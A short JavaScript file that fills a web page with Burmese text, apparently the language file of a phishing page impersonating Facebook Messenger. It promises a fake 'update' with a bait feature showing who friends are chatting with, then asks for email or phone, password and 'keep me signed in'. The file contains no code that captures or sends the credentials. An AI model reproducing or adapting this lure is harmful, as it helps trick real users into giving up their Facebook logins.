var mainParagraph = document.querySelector(".con-text");
var subMainParagraph = document.querySelector(".log-text");
var updateButton = document.querySelector(".update")
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".login"); 
var checkBox = document.querySelector(".chbox"); 

mainParagraph.innerHTML ="သင့်သူငယ်ချင်းများနှင့် စကားပြောနေသူကို သိလိုသည့် အင်္ဂါရပ်အသစ်များဖြင့် ခံစားနိုင်ရန် Messenger ကို နောက်ဆုံးဗားရှင်းသို့ အပ်ဒိတ်လုပ်ပါ။";
subMainParagraph.innerHTML ="သင့်ဘဝရှိလူများနှင့် ချက်ခြင်းဆက်သွယ်ပါ။ စတင်ရန် Facebook ဖြင့် ဝင်ရောက်ပါ။";
updateButton.innerHTML ="ယခု update လုပ်ပါ။";
userInput.setAttribute("placeholder" , "အီးမေးလ်လိပ်စာ သို့မဟုတ် ဖုန်းနံပါတ်");
passInput.setAttribute("placeholder" , "စကားဝှက်");
logButton.setAttribute("value" , "လော့ဂ်အင်");
checkBox.innerHTML ="ကျွန်ုပ်ကို လက်မှတ်ထိုးဝင်ထားပါ။";
